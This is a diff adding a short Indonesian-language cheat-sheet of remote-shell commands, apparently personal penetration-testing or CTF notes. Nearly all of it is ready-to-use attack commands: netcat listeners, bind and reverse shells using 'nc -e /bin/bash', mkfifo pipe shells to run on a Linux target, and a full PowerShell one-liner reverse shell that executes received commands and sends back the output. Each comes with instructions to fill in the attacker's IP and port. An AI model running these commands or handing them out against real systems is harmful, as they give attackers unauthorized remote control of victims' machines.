@@ -1,0 +1,28 @@
+[+] UNTUK RUN LISTENER DENGAN PORT DIBAWAH 1024, PERLU RUN MENGGUNAKAN SUDO
+
+
+- nc -lvnp PORT
+
+
+- nc -lvnp PORT -e /bin/bash <- akan execute `/bin/bash` dan menjadi bindshell
+|
+- nc lOCAL-IP PORT -e /bin/bash <- sama tapi revshell
+|
+- biasa digunakan ke Windows, karena selalu required static binary
+
+
+- mkfifo /tmp/f; nc -lvnp PORT < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
+|
+- gunakan ini di Linux TARGET untuk bindshell
+
+
+- mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+|
+- gunakan ini di Linux TARGET untuk revshell
+
+
+- one liner Pwshl revshell
+|
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('LOCAL-IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+|
+- ganti LOCAL-IP dan PORT
